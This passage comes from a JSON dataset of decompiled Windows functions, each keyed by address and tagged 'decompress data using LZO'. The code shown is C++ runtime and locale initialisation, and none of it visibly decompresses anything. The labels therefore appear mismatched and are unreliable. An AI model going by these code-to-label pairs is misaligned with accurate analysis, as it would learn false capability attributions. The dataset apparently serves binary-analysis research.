        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.0048c6b0(int32_t param_1, int16_t param_2, int16_t *param_3, int16_t *param_4, int32_t param_5, int32_t param_6\n                 )\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint var_1h;\n    \n    param_5 = param_5 - param_6;\n    uVar2 = *(param_1 + 0xc) & 0xb0;\n    if (uVar2 == 0x20) {\n        if (param_6 != 0) {\n            sub.msvcrt.dll_memcpy(param_3, param_4, param_6 * 2);\n        }\n        if (param_5 != 0) {\n            param_3 = param_3 + param_6;\n            do {\n                *param_3 = param_2;\n                param_3 = param_3 + 1;\n                param_5 = param_5 + -1;\n            } while (param_5 != 0);\n            return;\n        }\n    }\n    else {\n        if (uVar2 == 0x10) {\n            piVar3 = fcn.004a0ae0(param_1 + 0x6c);\n            iVar1 = (**(*piVar3 + 0x28))(0x2d);\n            if ((*param_4 == iVar1) || (iVar1 = (**(*piVar3 + 0x28))(0x2b),  *param_4 == iVar1)) {\n                *param_3 = iVar1;\n                param_6 = param_6 + -1;\n                param_3 = param_3 + 1;\n            }\n            else {\n                iVar1 = (**(*piVar3 + 0x28))(0x30);\n                if ((*param_4 == iVar1) && (1 < param_6)) {\n                    iVar1 = (**(*piVar3 + 0x28))(0x78);\n                    if ((param_4[1] != iVar1) && (iVar1 = (**(*piVar3 + 0x28))(0x58),  param_4[1] != iVar1)) {\n                        if (param_5 != 0) goto code_r0x0048c710;\n                        goto code_r0x004278b0;\n                    }\n                    param_6 = param_6 + -2;\n                    *param_3 = *param_4;\n                    param_3[1] = param_4[1];\n                    param_3 = param_3 + 2;\n                }\n            }\n        }\n        for (; param_5 != 0; param_5 = param_5 + -1) {\ncode_r0x0048c710:\n            *param_3 = param_2;\n            param_3 = param_3 + 1;\n        }\n        if (param_6 != 0) {\ncode_r0x004278b0:\n    // WARNING: Could not recover jumptable at 0x004278b0. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_memcpy)();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 725
    },
    "0048ca90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048ca90(int32_t param_1)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    do {\n        iVar2 = fcn.0041e2c0(iVar3);\n        if (iVar2 == -1) {\n            *(param_1 + 0xc) = 0;\n            goto code_r0x0048cac0;\n        }\n        *(param_1 + 0xd + iVar3) = iVar2;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0x80);\n    *(param_1 + 0xc) = 1;\ncode_r0x0048cac0:\n    iVar3 = 0;\n    do {\n        uVar1 = fcn.0041d300(iVar3);\n        *(param_1 + 0x8e + iVar3 * 2) = uVar1;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0x100);\n    iVar3 = 0;\n    do {\n        iVar2 = 1 << (iVar3 & 0x1f);\n        *(param_1 + 0x28e + iVar3 * 2) = iVar2;\n        uVar1 = fcn.00432140(iVar2);\n        *(param_1 + 0x2ae + iVar3 * 2) = uVar1;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0x10);\n    return;\n}\n",
        "token_count": 350
    },
    "0048cc10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048cc10(void)\n\n{\n    if (*0x4f59f4 == 0) {\n        if (*0x4f6ec8 == 0) {\ncode_r0x0048cc4d:\n            fcn.0048e200(2);\n            *0x4f6ec8 = 0x4f5c94;\n            *0x4f6ee4 = 0x4f5c94;\n            return;\n        }\n    }\n    else {\n        fcn.00418ba0(0x4f6edc, 0x48cc80);\n        if (*0x4f6ec8 == 0) goto code_r0x0048cc4d;\n    }\n    return;\n}\n",
        "token_count": 166
    },
    "0048ccf0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0048ccf0(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t in_ECX;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    uVar1 = *arg_8h;\n    uVar2 = arg_8h[2];\n    *0x4f6da4 = 0x50b4dc;\n    uVar3 = arg_8h[1];\n    *0x4f6da8 = 1;\n    *0x4f6dac = uVar1;\n    fcn.0049ba80(0);\n    if (*0x4f59f4 != 0) {\n        LOCK();\n    }\n    *0x4f6da8 = *0x4f6da8 + 1;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00432500();\n    *(iVar9 + iVar7 * 4) = 0x4f6da4;\n    *0x4f6e20 = 1;\n    *0x4f6e1c = 0x50b370;\n    *0x4f6e24 = fcn.0048f260();\n    if (*0x4f59f4 != 0) {\n        LOCK();\n    }\n    *0x4f6e20 = *0x4f6e20 + 1;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00432500();\n    *(iVar9 + iVar7 * 4) = 0x4f6e1c;\n    *0x4f6df0 = 1;\n    *0x4f6dec = 0x50a788;\n    *0x4f6df4 = uVar3;\n    fcn.0046e0f0(0, 0);\n    if (*0x4f59f4 != 0) {\n        LOCK();\n    }\n    *0x4f6df0 = *0x4f6df0 + 1;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00432500();\n    *(iVar9 + iVar7 * 4) = 0x4f6dec;\n    *0x4f6dfc = 1;\n    *0x4f6df8 = 0x50a7bc;\n    *0x4f6e00 = uVar2;\n    fcn.0046e4d0(0, 0);\n    if (*0x4f59f4 != 0) {\n        LOCK();\n    }\n    *0x4f6dfc = *0x4f6dfc + 1;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00432500();\n    *(iVar9 + iVar7 * 4) = 0x4f6df8;\n    *0x4f6dcc = 0x50b5e4;\n    if (*0x4f59f4 != 0) {\n        LOCK();\n    }\n    *0x4f6dd0 = 2;\n    iVar9 = *(in_ECX + 4);\n    iVar8 = fcn.00432500();\n    iVar7 = *0x4f59f4;\n    *(iVar9 + iVar8 * 4) = 0x4f6dcc;\n    *0x4f6ddc = 0x50b614;\n    if (iVar7 != 0) {\n        LOCK();\n    }\n    *0x4f6de0 = 2;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00432500();\n    *(iVar9 + iVar7 * 4) = 0x4f6ddc;\n    *0x4f6dbc = 0x50b524;\n    if (*0x4f59f4 != 0) {\n        LOCK();\n    }\n    *0x4f6dc0 = 2;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00432500();\n    *(iVar9 + iVar7 * 4) = 0x4f6dbc;\n    fcn.0049b7a0(1);\n    if (*0x4f59f4 != 0) {\n        LOCK();\n    }\n    *0x4f6d88 = *0x4f6d88 + 1;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00432500();\n    *(iVar9 + iVar7 * 4) = 0x4f6d84;\n    uVar4 = arg_8h[3];\n    *0x4f6db4 = 1;\n    uVar5 = arg_8h[4];\n    uVar6 = arg_8h[5];\n    *0x4f6db0 = 0x50b500;\n    *0x4f6db8 = uVar4;\n    fcn.0049bdd0(0);\n    if (*0x4f59f4 != 0) {\n        LOCK();\n    }\n    *0x4f6db4 = *0x4f6db4 + 1;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00432500();\n    *(iVar9 + iVar7 * 4) = 0x4f6db0;\n    *0x4f6e2c = 1;\n    *0x4f6e28 = 0x50b38c;\n    *0x4f6e30 = fcn.0048f260();\n    if (*0x4f59f4 != 0) {\n        LOCK();\n    }\n    *0x4f6e2c = *0x4f6e2c + 1;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00432500();\n    *(iVar9 + iVar7 * 4) = 0x4f6e28;\n    *0x4f6e08 = 1;\n    *0x4f6e04 = 0x50a7f0;\n    *0x4f6e0c = uVar5;\n    fcn.0046e8b0(0, 0);\n    if (*0x4f59f4 != 0) {\n        LOCK();\n    }\n    *0x4f6e08 = *0x4f6e08 + 1;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00432500();\n    *(iVar9 + iVar7 * 4) = 0x4f6e04;\n    *0x4f6e14 = 1;\n    *0x4f6e10 = 0x50a824;\n    *0x4f6e18 = uVar6;\n    fcn.0046eca0(0, 0);\n    if (*0x4f59f4 != 0) {\n        LOCK();\n    }\n    *0x4f6e14 = *0x4f6e14 + 1;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00432500();\n    *(iVar9 + iVar7 * 4) = 0x4f6e10;\n    *0x4f6dd4 = 0x50b5fc;\n    if (*0x4f59f4 != 0) {\n        LOCK();\n    }\n    *0x4f6dd8 = 2;\n    iVar9 = *(in_ECX + 4);\n    iVar8 = fcn.00432500();\n    iVar7 = *0x4f59f4;\n    *(iVar9 + iVar8 * 4) = 0x4f6dd4;\n    *0x4f6de4 = 0x50b62c;\n    if (iVar7 != 0) {\n        LOCK();\n    }\n    *0x4f6de8 = 2;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00432500();\n    *(iVar9 + iVar7 * 4) = 0x4f6de4;\n    *0x4f6dc4 = 0x50b54c;\n    if (*0x4f59f4 != 0) {\n        LOCK();\n    }\n    *0x4f6dc8 = 2;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00432500();\n    *(iVar9 + iVar7 * 4) = 0x4f6dc4;\n    fcn.0049b930(1);\n    if (*0x4f59f4 != 0) {\n        LOCK();\n    }\n    *0x4f6d98 = *0x4f6d98 + 1;\n    iVar9 = *(in_ECX + 4);\n    iVar7 = fcn.00432500();\n    *(iVar9 + iVar7 * 4) = 0x4f6d94;\n    iVar9 = *(in_ECX + 0xc);\n    iVar7 = fcn.00432500();\n    *(iVar9 + iVar7 * 4) = uVar1;\n    iVar9 = *(in_ECX + 0xc);\n    iVar7 = fcn.00432500();\n    *(iVar9 + iVar7 * 4) = uVar3;\n    iVar9 = *(in_ECX + 0xc);\n    iVar7 = fcn.00432500();\n    *(iVar9 + iVar7 * 4) = uVar2;\n    iVar9 = *(in_ECX + 0xc);\n    iVar7 = fcn.00432500();\n    *(iVar9 + iVar7 * 4) = uVar4;\n    iVar9 = *(in_ECX + 0xc);\n    iVar8 = fcn.00432500();\n    iVar7 = *(in_ECX + 0xc);\n    *(iVar9 + iVar8 * 4) = uVar5;\n    iVar9 = fcn.00432500();\n    *(iVar7 + iVar9 * 4) = uVar6;\n    return;\n}\n",
        "token_count": 2372
    },
    "0048d3e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0048d3e0(uint *arg_8h, uint *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    puVar1 = fcn.004a3500(0xc);\n    uVar3 = *arg_8h;\n    puVar1[1] = 0;\n    *puVar1 = 0x50b4dc;\n    puVar1[2] = 0;\n    fcn.0049ba80(uVar3);\n    if (*0x4f59f4 == 0) {\n        puVar1[1] = puVar1[1] + 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00432500();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004a3500(0xc);\n    var_1ch = *arg_8h;\n    puVar1[1] = 0;\n    *puVar1 = 0x50b370;\n    uVar3 = fcn.0048f2d0(&var_1ch);\n    puVar1[2] = uVar3;\n    if (*0x4f59f4 == 0) {\n        puVar1[1] = puVar1[1] + 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00432500();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004a3500(0xc);\n    uVar3 = *arg_8h;\n    puVar1[1] = 0;\n    *puVar1 = 0x50a788;\n    puVar1[2] = 0;\n    fcn.0046e0f0(uVar3, 0);\n    if (*0x4f59f4 == 0) {\n        puVar1[1] = puVar1[1] + 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00432500();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004a3500(0xc);\n    uVar3 = *arg_8h;\n    puVar1[1] = 0;\n    *puVar1 = 0x50a7bc;\n    puVar1[2] = 0;\n    fcn.0046e4d0(uVar3, 0);\n    if (*0x4f59f4 == 0) {\n        puVar1[1] = puVar1[1] + 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00432500();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004a3500(8);\n    puVar1[1] = 0;\n    *puVar1 = 0x50b5e4;\n    if (*0x4f59f4 == 0) {\n        puVar1[1] = 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00432500();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004a3500(8);\n    iVar4 = *0x4f59f4;\n    puVar1[1] = 0;\n    *puVar1 = 0x50b614;\n    if (iVar4 == 0) {\n        puVar1[1] = 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00432500();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004a3500(8);\n    iVar4 = *0x4f59f4;\n    puVar1[1] = 0;\n    *puVar1 = 0x50b524;\n    if (iVar4 == 0) {\n        puVar1[1] = 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00432500();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    iVar4 = fcn.004a3500(0x10);\n    fcn.0049b760(*arg_8h, arg_10h, 0);\n    if (*0x4f59f4 == 0) {\n        *(iVar4 + 4) = *(iVar4 + 4) + 1;\n    }\n    else {\n        LOCK();\n        *(iVar4 + 4) = *(iVar4 + 4) + 1;\n    }\n    iVar2 = *(in_ECX + 4);\n    iVar5 = fcn.00432500();\n    *(iVar2 + iVar5 * 4) = iVar4;\n    puVar1 = fcn.004a3500(0xc);\n    uVar3 = *arg_8h;\n    puVar1[1] = 0;\n    *puVar1 = 0x50b500;\n    puVar1[2] = 0;\n    fcn.0049bdd0(uVar3);\n    if (*0x4f59f4 == 0) {\n        puVar1[1] = puVar1[1] + 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00432500();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004a3500(0xc);\n    var_1ch = *arg_8h;\n    puVar1[1] = 0;\n    *puVar1 = 0x50b38c;\n    uVar3 = fcn.0048f2d0(&var_1ch);\n    puVar1[2] = uVar3;\n    if (*0x4f59f4 == 0) {\n        puVar1[1] = puVar1[1] + 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00432500();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004a3500(0xc);\n    puVar1[1] = 0;\n    uVar3 = *arg_ch;\n    *puVar1 = 0x50a7f0;\n    puVar1[2] = 0;\n    fcn.0046e8b0(uVar3, arg_14h);\n    if (*0x4f59f4 == 0) {\n        puVar1[1] = puVar1[1] + 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00432500();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004a3500(0xc);\n    puVar1[1] = 0;\n    uVar3 = *arg_ch;\n    *puVar1 = 0x50a824;\n    puVar1[2] = 0;\n    fcn.0046eca0(uVar3, arg_14h);\n    if (*0x4f59f4 == 0) {\n        puVar1[1] = puVar1[1] + 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00432500();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004a3500(8);\n    puVar1[1] = 0;\n    *puVar1 = 0x50b5fc;\n    if (*0x4f59f4 == 0) {\n        puVar1[1] = 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00432500();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004a3500(8);\n    iVar4 = *0x4f59f4;\n    puVar1[1] = 0;\n    *puVar1 = 0x50b62c;\n    if (iVar4 == 0) {\n        puVar1[1] = 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00432500();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    puVar1 = fcn.004a3500(8);\n    iVar4 = *0x4f59f4;\n    puVar1[1] = 0;\n    *puVar1 = 0x50b54c;\n    if (iVar4 == 0) {\n        puVar1[1] = 1;\n    }\n    else {\n        LOCK();\n        puVar1[1] = puVar1[1] + 1;\n    }\n    iVar4 = *(in_ECX + 4);\n    iVar2 = fcn.00432500();\n    *(iVar4 + iVar2 * 4) = puVar1;\n    iVar4 = fcn.004a3500(0x10);\n    fcn.0049b8f0(*arg_8h, arg_10h, 0);\n    if (*0x4f59f4 == 0) {\n        *(iVar4 + 4) = *(iVar4 + 4) + 1;\n    }\n    else {\n        LOCK();\n        *(iVar4 + 4) = *(iVar4 + 4) + 1;\n    }\n    iVar2 = *(in_ECX + 4);\n    iVar5 = fcn.00432500();\n    *(iVar2 + iVar5 * 4) = iVar4;\n    return;\n}\n",
        "token_count": 2666
    },
    "0048dc70": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0048dc70(int32_t param_1, int32_t *param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    int32_t *piVar12;\n    int32_t *piVar13;\n    int32_t iVar14;\n    int32_t **ppiVar15;\n    ulong uVar16;\n    \n    if (param_3 == 0) {\n        return;\n    }\n    uVar7 = fcn.00432500();\n    if (*(param_1 + 8) - 1U < uVar7) {\n        uVar11 = uVar7 + 4;\n        iVar3 = *(param_1 + 4);\n        iVar14 = uVar11 * 4;\n        if (0x1fffffff < uVar11) {\n            iVar14 = -1;\n        }\n        iVar8 = fcn.004a34e0(iVar14);\n        uVar4 = *(param_1 + 8);\n        if (uVar4 != 0) {\n            iVar5 = *(param_1 + 4);\n            uVar9 = 0;\n            do {\n                *(iVar8 + uVar9 * 4) = *(iVar5 + uVar9 * 4);\n                uVar9 = uVar9 + 1;\n            } while (uVar9 != uVar4);\n        }\n        if (uVar4 < uVar11) {\n            puVar10 = iVar8 + uVar4 * 4;\n            do {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            } while (iVar8 + 0x10 + uVar7 * 4 != puVar10);\n        }\n        iVar5 = *(param_1 + 0xc);\n        iVar14 = fcn.004a34e0(iVar14);\n        uVar4 = *(param_1 + 8);\n        if (uVar4 != 0) {\n            iVar6 = *(param_1 + 0xc);\n            uVar9 = 0;\n            do {\n                *(iVar14 + uVar9 * 4) = *(iVar6 + uVar9 * 4);\n                uVar9 = uVar9 + 1;\n            } while (uVar9 != uVar4);\n        }\n        if (uVar4 < uVar11) {\n            puVar10 = iVar14 + uVar4 * 4;\n            do {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            } while (puVar10 != iVar14 + 0x10 + uVar7 * 4);\n        }\n        *(param_1 + 4) = iVar8;\n        *(param_1 + 0xc) = iVar14;\n        *(param_1 + 8) = uVar11;\n        if (iVar3 != 0) {\n            fcn.004a34b0(iVar3);\n        }\n        if (iVar5 != 0) {\n            fcn.004a34b0(iVar5);\n        }\n    }\n    if (*0x4f59f4 == 0) {\n        *(param_3 + 4) = *(param_3 + 4) + 1;\n    }\n    else {\n        LOCK();\n        *(param_3 + 4) = *(param_3 + 4) + 1;\n    }\n    ppiVar2 = *(param_1 + 4) + uVar7 * 4;\n    piVar12 = *ppiVar2;\n    if (piVar12 == NULL) goto code_r0x0048de6b;\n    if (*0x506520 == 0) {\ncode_r0x0048de4b:\n        if (*0x4f59f4 == 0) goto code_r0x0048de59;\ncode_r0x0048def0:\n        LOCK();\n        piVar1 = piVar12 + 1;\n        iVar14 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    else {\n        do {\n            uVar11 = fcn.00432500();\n            if (uVar11 == uVar7) {\n                iVar14 = *(param_1 + 4);\n                uVar16 = fcn.00432500();\n                ppiVar15 = iVar14 + uVar16 * 4;\n                if (*ppiVar15 != NULL) {\n                    piVar12 = fcn.004334d0(*((uVar16 >> 0x20) + 4));\n                    if (*0x4f59f4 == 0) {\n                        piVar12[1] = piVar12[1] + 1;\n                        piVar13 = *ppiVar15;\ncode_r0x0048de35:\n                        iVar14 = piVar13[1];\n                        piVar13[1] = iVar14 + -1;\n                    }\n                    else {\n                        LOCK();\n                        piVar12[1] = piVar12[1] + 1;\n                        piVar13 = *ppiVar15;\n                        piVar1 = piVar13 + 1;\n                        if (*0x4f59f4 == 0) goto code_r0x0048de35;\n                        LOCK();\n                        iVar14 = *piVar1;\n                        *piVar1 = *piVar1 + -1;\n                    }\n                    if (iVar14 == 1) {\n                        (**(*piVar13 + 4))();\n                    }\ncode_r0x0048de47:\n                    *ppiVar15 = piVar12;\n                    piVar12 = *ppiVar2;\n                    goto code_r0x0048de4b;\n                }\n                break;\n            }\n            uVar16 = fcn.00432500();\n            if (uVar16 == uVar7) {\n                iVar14 = *(param_1 + 4);\n                uVar16 = fcn.00432500();\n                ppiVar15 = iVar14 + uVar16 * 4;\n                if (*ppiVar15 != NULL) {\n                    piVar12 = fcn.00432b40(*(uVar16 >> 0x20));\n                    if (*0x4f59f4 == 0) {\n                        piVar12[1] = piVar12[1] + 1;\n                        piVar13 = *ppiVar15;\ncode_r0x0048df55:\n                        iVar14 = piVar13[1];\n                        piVar13[1] = iVar14 + -1;\n                    }\n                    else {\n                        LOCK();\n                        piVar12[1] = piVar12[1] + 1;\n                        piVar13 = *ppiVar15;\n                        piVar1 = piVar13 + 1;\n                        if (*0x4f59f4 == 0) goto code_r0x0048df55;\n                        LOCK();\n                        iVar14 = *piVar1;\n                        *piVar1 = *piVar1 + -1;\n                    }\n                    if (iVar14 == 1) {\n                        (**(*piVar13 + 4))();\n                    }\n                    goto code_r0x0048de47;\n                }\n                break;\n            }\n        } while (*((uVar16 >> 0x20) + 8) != 0);\n        piVar12 = *ppiVar2;\n        if (*0x4f59f4 != 0) goto code_r0x0048def0;\ncode_r0x0048de59:\n        iVar14 = piVar12[1];\n        piVar12[1] = iVar14 + -1;\n    }\n    if (iVar14 == 1) {\n        (**(*piVar12 + 4))();\n    }\ncode_r0x0048de6b:\n    iVar14 = *(param_1 + 8);\n    *ppiVar2 = param_2;\n    if (iVar14 != 0) {\n        uVar7 = 0;\n        iVar14 = *(param_1 + 0xc);\n        do {\n            piVar12 = *(iVar14 + uVar7 * 4);\n            if (piVar12 != NULL) {\n                if (*0x4f59f4 == 0) {\n                    iVar14 = piVar12[1];\n                    piVar12[1] = iVar14 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = piVar12 + 1;\n                    iVar14 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (iVar14 == 1) {\n                    (**(*piVar12 + 4))();\n                }\n                iVar14 = *(param_1 + 0xc);\n                *(iVar14 + uVar7 * 4) = 0;\n            }\n            uVar7 = uVar7 + 1;\n        } while (uVar7 <= *(param_1 + 8) && *(param_1 + 8) != uVar7);\n    }\n    return;\n}\n",
        "token_count": 2025
    },
    "0048e200": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nvoid __cdecl fcn.0048e200(uint arg_8h)\n\n{\n    uint *puVar1;\n    ushort *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_ECX;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_bp_8h;\n    \n    in_ECX[2] = 0x2e;\n    *in_ECX = arg_8h;\n    puVar1 = 0x4f67c0;\n    do {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 1;\n    } while (puVar1 != 0x4f6878);\n    in_ECX[1] = 0x4f67c0;\n    puVar1 = 0x4f66c0;\n    do {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 1;\n    } while (puVar1 != 0x4f6778);\n    in_ECX[3] = 0x4f66c0;\n    puVar1 = 0x4f66a4;\n    do {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 1;\n    } while (puVar1 != 0x4f66bc);\n    in_ECX[4] = 0x4f66a4;\n    *0x4f66a4 = 0x4f6180;\n    puVar2 = fcn.0048f250();\n    *0x4f6180 = *puVar2;\n    fcn.0048c8d0(0, 0, 1);\n    fcn.0048dc70(0x4f6ec0, 0x4f61a0);\n    fcn.00499850(1);\n    fcn.0048dc70(0x4f6f30, 0x4f6780);\n    *0x4f5d04 = 1;\n    *0x4f5d24 = 0;\n    *0x4f5d00 = 0x50adf0;\n    *0x4f5d08 = 0;\n    *0x4f5d0c = 0;\n    *0x4f5d10 = 0;\n    *0x4f5d14 = 0;\n    *0x4f5d18 = 0;\n    *0x4f5d1c = 0;\n    *0x4f5d20 = 0;\n    *0x4f5d64 = 0;\n    *0x4f5c04 = 1;\n    *0x4f5c00 = 0x50a5c0;\n    *0x4f5c08 = 0x4f5d00;\n    fcn.00498e40(0);\n    fcn.0048dc70(0x4f6f08, 0x4f5c00);\n    *0x4f6884 = 1;\n    *0x4f6880 = 0x50b3a8;\n    fcn.0048dc70(0x4f6f40, 0x4f6880);\n    *0x4f6894 = 1;\n    *0x4f6890 = 0x50b420;\n    fcn.0048dc70(0x4f6f48, 0x4f6890);\n    *0x4f679c = 1;\n    *0x4f6798 = 0x50a550;\n    *0x4f67a0 = fcn.0048f260();\n    fcn.0048dc70(0x4f6ef8, 0x4f6798);\n    *0x4f6000 = 0x50af14;\n    *0x4f6004 = 1;\n    *0x4f6008 = 0;\n    *0x4f600c = 0;\n    *0x4f6010 = 0;\n    *0x4f6012 = 0;\n    *0x4f6014 = 0;\n    *0x4f6018 = 0;\n    *0x4f601c = 0;\n    *0x4f6020 = 0;\n    *0x4f6024 = 0;\n    *0x4f6028 = 0;\n    *0x4f602c = 0;\n    *0x4f6030 = 0;\n    *0x4f6034 = 0;\n    *0x4f6043 = 0;\n    *0x4f5cac = 1;\n    *0x4f5ca8 = 0x50a2a0;\n    *0x4f5cb0 = 0x4f6000;\n    fcn.0048f700(0, 0);\n    fcn.0048dc70(0x4f6ee8, 0x4f5ca8);\n    *0x4f6060 = 0x50af24;\n    *0x4f6064 = 1;\n    *0x4f6068 = 0;\n    *0x4f606c = 0;\n    *0x4f6070 = 0;\n    *0x4f6072 = 0;\n    *0x4f6074 = 0;\n    *0x4f6078 = 0;\n    *0x4f607c = 0;\n    *0x4f6080 = 0;\n    *0x4f6084 = 0;\n    *0x4f6088 = 0;\n    *0x4f608c = 0;\n    *0x4f6090 = 0;\n    *0x4f6094 = 0;\n    *0x4f60a3 = 0;\n    *0x4f5cb8 = 1;\n    *0x4f5cb4 = 0x50a2d4;\n    *0x4f5cbc = 0x4f6060;\n    fcn.0048fae0(0, 0);\n    fcn.0048dc70(0x4f6eec, 0x4f5cb4);\n    *0x4f5c4c = 1;\n    *0x4f5c48 = 0x50a660;\n    fcn.0048dc70(0x4f6f18, 0x4f5c48);\n    *0x4f5c5c = 1;\n    *0x4f5c58 = 0x50a690;\n    fcn.0048dc70(0x4f6f20, 0x4f5c58);\n    *0x4f5e44 = 1;\n    *0x4f5e40 = 0x50ae24;\n    *0x4f5e48 = 0;\n    *0x4f5e4c = 0;\n    *0x4f5e50 = 0;\n    *0x4f5e54 = 0;\n    *0x4f5e58 = 0;\n    *0x4f5e5c = 0;\n    *0x4f5e60 = 0;\n    *0x4f5e64 = 0;\n    *0x4f5e68 = 0;\n    *0x4f5e6c = 0;\n    *0x4f5e70 = 0;\n    *0x4f5e74 = 0;\n    *0x4f5e78 = 0;\n    *0x4f5e7c = 0;\n    *0x4f5e80 = 0;\n    *0x4f5e84 = 0;\n    *0x4f5e88 = 0;\n    